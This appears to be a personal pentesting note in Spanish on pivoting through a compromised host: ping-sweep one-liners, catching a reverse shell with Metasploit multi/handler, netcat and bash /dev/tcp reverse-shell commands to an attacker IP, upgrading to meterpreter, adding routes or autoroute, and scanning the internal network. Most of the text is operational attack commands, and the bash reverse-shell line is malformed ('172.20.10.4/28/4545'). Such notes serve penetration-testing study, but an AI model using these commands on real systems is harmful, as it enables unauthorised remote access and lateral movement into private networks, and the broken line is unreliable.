Antes es necesario ver si el activo cuenta con otra interfaz de red.

```
ifconfig
```

Una vez tengamos una interfaz de red necesario ver si existe algún servicio afiliado a la IP en cuestión.
```
ss -natup
```

Enumeración de host en base a una línea de bash:

https://www.rubyguides.com/2012/02/cli-ninja-ping-sweep/

```
 Linux
 
 for i in {1..254} ;do (ping -c 1 192.168.1.$i | grep "bytes from" &) ;done

 Windows
 
 for /L %i in (1,1,255) do @ping -n 1 -w 200 192.168.1.%i > nul && echo 192.168.1.%i is up.
```

-----

Una vez que tengamos la shell tenemos que tenerla en [[metasploit]] y es necesario aplicar el siguiente comando:

```
msfconsole

use multi/handler

set LHOST IPAtacante

set LPORT PuertoAtacante
```

En la máquina víctima (antes ya habiendo tenido la shell) aplicamos la reverse shell:

```
nc IPAtacante PuertoAtacante -e /bin/bash

o

bash -c "bash -i >&/dev/tcp/172.20.10.4/28/4545 0>&1"
```

Ahora ya teniendo la shell es necesario activar la shell meterpreter

```
use shell_to_meterpreter

set LHOST IPAtacante

set LPORT PuertoAtacante

set SESSION 1 (número de session donde se tenga la shell normal)

run
```

----

### Método manual con Metasploit para hacer routeo

Una vez con una shell meterpreter es necesario que veamos si existe alguna ruta con el siguiente comando

```
route
```

De no tener es necesario agregar el segmento de red de la segunda interfaz de red que tiene el activo ya comprometido de la siguiente forma: 

```
route add 192.168.100.0/24 2
```

- El /24 hace referencia al segmento de red
- El 2 hace referencia a la sesión meterpreter que se utilizará

Luego es necesario aplicar el siguiente comando:

```
route
```

Eliminar una ruta: 

```
route del 192.168.100.0/24 2
```

- El /24 hace referencia al segmento de red
- El 2 hace referencia a la sesión meterpreter que se utilizará

-----

### Método manual con Metasploit para hacer routeo

Si queremos que se pueda realizar el routing más rápido se puede utilizar el siguiente módulo de [[metasploit]]

```
use multi/manage/autoroute

set SESSION 1 (session donde se tiene la shell meterpreter)

run
```

---

Una vez que se tiene routeado el activo es necesario que podamos intentar reconocer los activos de la interfaz de red de la siguiente forma con [[nmap]]

```
nmap -sn 192.168.100.0/24
```

En caso no funcione probar con la enumeración en una línea o con un escaner de puertos del propio metasploit:

```
use scanner/portscan/tcp

set RHOSTS 192.168.100.21
```
